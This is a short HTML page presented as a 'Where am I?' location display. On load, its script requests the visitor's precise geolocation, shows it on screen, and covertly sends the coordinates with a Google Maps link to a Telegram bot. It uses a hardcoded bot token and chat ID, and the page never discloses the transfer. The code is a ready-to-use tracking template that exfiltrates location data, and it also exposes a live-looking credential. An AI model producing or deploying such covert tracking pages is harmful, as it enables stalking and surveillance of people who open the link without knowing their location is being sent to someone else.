<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Where am I?</title>
</head>
<body>
    <h2>Where am I?</h2>
    <p id="location">Fetching location...</p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000, 
                    maximumAge: 0
                });
            } else {
                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            document.getElementById("location").innerHTML = `Latitude: ${lat} <br>Longitude: ${lon}`;

            // ✅ Call sendLocation to send the data to Telegram
            sendLocation(lat, lon);
        }

        function showError(error) {
            let message = "";
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    message = "Location access was denied. Please allow location access in your browser settings.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    message = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "An unknown error occurred.";
                    break;
            }
            document.getElementById("location").innerHTML = message;
        }

        function sendLocation(lat, lon) {
            const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0"; // 🔴 Replace with new bot token
            const chatId = "6238170291"; // 🔴 Replace with your Telegram chat ID

            const message = `🌍 Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(response => response.json())
            .then(data => console.log("Message sent:", data))
            .catch(error => console.error("Error:", error));
        }

        // ✅ Run getLocation automatically when page loads
        window.onload = getLocation;
    </script>
</body>
</html>
